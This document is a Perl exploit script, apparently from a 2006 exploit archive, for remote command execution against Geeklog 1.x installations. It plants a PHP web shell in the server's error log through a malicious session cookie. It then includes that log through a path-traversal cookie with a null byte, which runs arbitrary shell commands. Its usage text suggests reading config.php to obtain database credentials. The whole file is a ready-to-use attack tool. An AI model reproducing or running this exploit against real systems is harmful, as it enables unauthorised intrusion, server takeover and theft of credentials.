#!/usr/bin/perl -w
use IO::Socket;

print "*************************************************************************\r\n";
print "|                   Geeklog 1.* remote commands execution               |\r\n";
print "|                     By rgod rgod<AT>autistici<DOT>org                 |\r\n";
print "|                   site: http://retrogod.altervista.org                |\r\n";
print "|                                                                       |\r\n";
print "*************************************************************************\r\n";
print "| -> this works against magic_quotes_gpc = Off                          |\r\n";
print "*************************************************************************\r\n";
sub main::urlEncode {
    my ($string) = @_;
    $string =~ s/(\W)/"%" . unpack("H2", $1)/ge;
    #$string# =~ tr/.//;
    return $string;
 }

$serv=$ARGV[0];
$path=$ARGV[1];
$cmd=""; for ($i=2; $i<=$#ARGV; $i++) {$cmd.="%20".urlEncode($ARGV[$i]);};

if (@ARGV < 3)
{
print "Usage:\r\n";
print "perl pblg_xpl.pl SERVER PATH COMMAND\r\n\r\n";
print "SERVER         - Server where Geeklog is installed.\r\n";
print "PATH           - Path to Geeklog (ex: /geeklog/ or just /) \r\n";
print "COMMAND        - a shell command (\"cat ./../config.php\" to see database\r\n";
print "                 username & password\")\r\n";
print "Example:\r\n";
print "perl geeklog_14_xpl.pl localhost /geeklog/ ls -la \r\n";
exit();
}

  $sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$serv", Timeout  => 10, PeerPort=>"http(80)")
  or die "[+] Connecting ... Could not connect to host.\n\n";

  $shell='<?php ob_clean();echo"Hi Master!\r\n";ini_set("max_execution_time",0);passthru($_GET[CMD]);die;?>';
  $shell=urlEncode($shell);
  $data="loginname=sun&passwd=sun";
  print $sock "POST ".$path."users.php HTTP/1.1\r\n";
  print $sock "Host: ".$serv."\r\n";
  print $sock "Content-Length: ".length($data)."\r\n";
  print $sock "Cookie: gl_session=%27".$shell."\r\n";
  print $sock "Connection: Close\r\n\r\n";
  print $sock $data;
  close($sock);

  $sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$serv", Timeout  => 10, PeerPort=>"http(80)")
  or die "[+] Connecting ... Could not connect to host.\n\n";

  $xpl="../logs/error.log";
  $xpl=urlEncode($xpl)."%00";
  print $sock "GET ".$path."index.php?CMD=".$cmd." HTTP/1.1\r\n";
  print $sock "Host: ".$serv."\r\n";
  print $sock "Cookie: language=".$xpl.";\r\n";
  print $sock "Connection: Close\r\n\r\n";

  while ($answer = <$sock>) {
    print $answer;
  }
  close($sock);

# milw0rm.com [2006-02-20]
